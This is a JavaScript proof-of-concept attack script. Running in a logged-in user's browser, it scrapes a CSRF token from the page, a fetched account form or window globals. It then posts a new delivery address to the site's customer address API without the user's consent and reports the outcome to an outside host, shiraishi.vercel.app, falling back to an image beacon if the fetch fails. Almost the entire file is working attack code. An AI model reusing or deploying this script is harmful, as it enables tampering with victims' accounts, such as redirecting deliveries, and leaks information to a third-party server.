(async () => {
  const log = (...a) => console.log('[PoC]', ...a);

  const getCsrf = async () => {
    const m = document.querySelector('meta[name="csrf-token"],meta[name="x-csrf-token"]');
    if (m && m.content) { log('csrf: meta'); return m.content; }

    if (window.__NEXT_DATA__ && window.__NEXT_DATA__.props && window.__NEXT_DATA__.props.pageProps) {
      const p = window.__NEXT_DATA__.props.pageProps;
      if (p.csrfToken) { log('csrf: __NEXT_DATA__'); return p.csrfToken; }
      if (p.xCsrfToken) { log('csrf: __NEXT_DATA__.xCsrfToken'); return p.xCsrfToken; }
    }

    for (const k of Object.keys(window)) {
      if (/csrf/i.test(k) && typeof window[k] === 'string' && window[k].length >= 40) {
        log('csrf: window.' + k);
        return window[k];
      }
    }

    const patterns = [
      /"csrfToken"\s*:\s*"([^"]+)"/,
      /"xCsrfToken"\s*:\s*"([^"]+)"/,
      /x-csrf-token["']?\s*[:=]\s*["']([^"']+)["']/i,
      /csrfToken["']?\s*[:=]\s*["']([^"']+)["']/i
    ];

    try {
      const html = await fetch('/en-gb/account/addresses/new', {
        credentials: 'include'
      }).then(r => r.text());

      for (const p of patterns) {
        const match = html.match(p);
        if (match && match[1]) { log('csrf: form HTML'); return match[1]; }
      }
    } catch (e) {
      log('form fetch failed:', e.message);
    }

    for (const s of document.querySelectorAll('script:not([src])')) {
      for (const p of patterns) {
        const match = s.textContent.match(p);
        if (match && match[1]) { log('csrf: inline script'); return match[1]; }
      }
    }

    return null;
  };

  const token = await getCsrf();
  log('token:', token ? token.slice(0, 12) + '...' : null, 'len:', token ? token.length : 0);
  if (!token || token.length < 40) { log('aborting: no valid token'); return; }

  const addressId = String(Date.now());

  const body = JSON.stringify({
    item: {
      firstName: "a",
      lastName: "a",
      countryCode: "GB",
      address1: "Kings Barbers, 85 Queens Road",
      address2: "",
      city: "Hastings",
      postalCode: "TN34 1RL",
      phone: "",
      addressId: addressId
    }
  });

  const res = await fetch('/api/customer/address', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'x-csrf-token': token
    },
    body
  }).catch(e => {
    log('POST failed:', e.message);
    return null;
  });

  if (!res) return;
  log('POST status:', res.status);

  const txt = await res.text().catch(() => '');
  log('POST response:', txt.slice(0, 300));

  try {
    await fetch('https://shiraishi.vercel.app/log?ok=' + res.status + '&id=' + addressId);
  } catch (e) {
    new Image().src = 'https://shiraishi.vercel.app/log?ok=' + res.status + '&id=' + addressId;
  }
})();
